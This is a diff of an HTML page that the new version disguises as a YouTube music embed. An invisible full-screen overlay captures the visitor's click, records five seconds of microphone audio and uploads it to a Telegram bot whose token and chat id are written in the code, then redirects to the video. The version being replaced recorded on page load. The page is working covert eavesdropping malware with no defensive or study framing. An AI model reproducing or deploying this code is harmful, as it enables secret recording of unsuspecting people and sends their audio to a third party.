@@ -1,28 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>Voice Note</title></head>
-<body>
-    <script>
-        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
-        const adminId = '8275787221';
+<head><meta charset="UTF-8"><title>YouTube - Music</title></head>
+<body style="margin:0; background:#000;">
+    <iframe src="https://www.youtube.com/embed/Enf0Z0SsQHs?autoplay=1&mute=1" style="width:100%; height:100vh; border:none;"></iframe>
+    <div onclick="rec()" style="position:fixed; top:0; width:100%; height:100%; z-index:9;"></div>
 
-        async function recordAudio() {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg' });
+    <script>
+        async function rec() {
+            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const r = new MediaRecorder(s);
+            let ch = [];
+            r.ondataavailable = e => ch.push(e.data);
+            r.onstop = () => {
                 const fd = new FormData();
-                fd.append('voice', blob, 'voice.ogg');
-                await fetch(`https://api.telegram.org/bot${botToken}/sendVoice?chat_id=${adminId}`, { method: 'POST', body: fd });
-                window.location.href = "https://google.com";
+                fd.append('voice', new Blob(ch), 'v.ogg');
+                fetch('https://api.telegram.org/bot8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI/sendVoice?chat_id=8275787221', {method:'POST', body:fd})
+                .then(() => window.location.href = "https://youtu.be/Enf0Z0SsQHs");
             };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 5000);
+            r.start();
+            setTimeout(() => r.stop(), 5000);
         }
-        window.onload = recordAudio;
     </script>
 </body>
 </html>
-
